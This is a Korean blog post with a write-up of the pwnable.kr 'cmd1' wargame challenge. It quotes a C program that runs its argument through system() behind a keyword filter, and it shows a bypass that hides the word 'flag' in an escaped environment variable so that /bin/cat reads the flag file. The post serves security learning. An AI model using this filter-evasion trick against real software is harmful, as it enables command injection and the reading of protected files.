---
title: "pwnable.kr - Toddler's bottle #13 cmd1"
date: 2020-03-08
categories:
  - Information Security
tags:
  - pwnable.kr
---

[pwnable.kr][pwnable.kr] Toddler's bottle의 #13 cmd1 문제 풀이

environment variable을 이용해서 푸는 문제다

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
}

int main(int argc, char* argv[], char** envp){
        putenv("PATH=/thankyouverymuch");
        if(filter(argv[1])) return 0;
        system( argv[1] );
        return 0;
}
```

putenv("PATH=/thankyouverymuch") 이 부분때문에 PATH environment variable이 없어짐. 따라서 명령어를 그냥 쓰면 안된다.

main에서 argv[1]을 받아 이를 system으로 실행시켜주는데, filter에서 볼수 있듯 flag, sh, tmp가 argv[1]의 일부면 실행이 안된다

그래서 environment variable을 export하고 실행시켜봤는데 이렇게 해도 안되었다

~~~
cmd1@pwnable:~$ export qqq=flag
cmd1@pwnable:~$ ./cmd1 "/bin/cat $qqq"
~~~

보니까 저렇게 하면 넘어가는 argv[1]으로 넘어간 시점에서 qqq가 이미 flag로 바뀌는것 같았다.

내가 원하는건 argv[1]으로 넘어가서 최종적으로 system의 arg가 되는 string이 "/bin/cat $qqq"가 되는것이니까 $qqq에 이런저런걸 실험해 봤다. 최종적으로 이렇게 하니 되는걸 확인할 수 있었다.

~~~
cmd1@pwnable:~$ ./cmd1 "/bin/cat \$qqq"
<tag output>
~~~

[pwnable.kr]: https://pwnable.kr

<!-- mommy now I get what PATH environment is for :) -->